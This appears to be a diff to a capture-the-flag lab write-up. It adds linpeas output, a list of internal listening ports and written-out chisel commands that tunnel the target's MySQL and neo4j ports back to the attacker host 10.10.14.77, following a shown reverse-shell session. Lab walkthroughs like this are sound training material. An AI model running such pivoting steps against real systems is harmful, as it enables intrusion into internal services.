@@ -112,7 +112,7 @@ Exploiting this is just too easy, it just needs to be an absolute path and the a
 
 So 2 users we may need to look out for being John and Dev
 
-## LFI Vulnerability
+### LFI Vulnerability
 Using the Local File Inclusion vulnerability, i searched for default configuration files, knowing the site was hosted on NGINX, i searched
 `/etc/nginx/nginx.conf` which didn't give anything useful, checking `/etc/nginx/sites-enabled/default` however...
 
@@ -237,6 +237,62 @@ Connection received on 10.10.11.210 58992
 /bin/sh: 0: can't access tty; job control turned off
 $ whoami
 www-data
-
 ```
+### LinPeas
+Inside the box, linpeas is ran, as seen before, neo4j is running but the user www-data does not have permissions to access it directly via cli.
+```
+╔══════════╣ Analyzing Neo4j Files (limit 70)
+-rw-r--r-- 1 root root 733 Nov 21 07:59 v
+
+-rwxr-xr-x 1 root root 2969 Dec  4 22:22 /etc/init.d/neo4j
+
+drwxr-x--- 2 neo4j adm 4096 Mar 30 11:51 /etc/neo4j
+find: ‘/etc/neo4j’: Permission denied
+
+-rwxr-xr-x 1 root root 259 Mar 23 15:01 /usr/bin/neo4j
+
+drwxr-sr-x 12 root staff 4096 Mar 30 11:51 /usr/local/lib/python3.8/dist-packages/neo4j
+
+drwxr-xr-x 2 root root 4096 Mar 30 11:51 /usr/share/doc/neo4j
+
+-rw-r--r-- 1 root root 312 Mar 23 15:01 /usr/share/lintian/overrides/neo4j
+
+drwxr-x--- 7 neo4j adm 4096 Mar 30 11:51 /usr/share/neo4j
+find: ‘/usr/share/neo4j’: Permission denied
+
+drwxr-x--- 10 neo4j adm 4096 Mar 30 11:51 /var/lib/neo4j
+find: ‘/var/lib/neo4j’: Permission denied
+
+drwxr-xr-x 2 neo4j adm 4096 Mar 30 12:08 /var/log/neo4j
+```
+
+More hosted services are avaliable only locally on this machine.
+```
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1020/nginx: worker  
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                          
+```
+Specifically, 3000, 8001, 3306 (sql), 7474 and 7687 (neo4j)
+
+### Chisel
+
+To be able to access these services i initiate a reverse tunnel from the target to our attacking machine using `chisel` which is built for exactly this.
+
+To tunnel this, i start a chisel server for reverse tunneling with `chisel server -p 9001 --reverse` 
+
+The chisel binary is then uploaded to the targets `/tmp/` dir and ran in client mode tunneling the local ports to our attacking machine `chisel client 10.10.14.77:9001 R:3306:localhost:3306 R:3000:localhost:3000 R:8001:localhost:8001 R:7474:localhost:7474`
+
+## Info gathering round 2
+
+### Port 3000
 
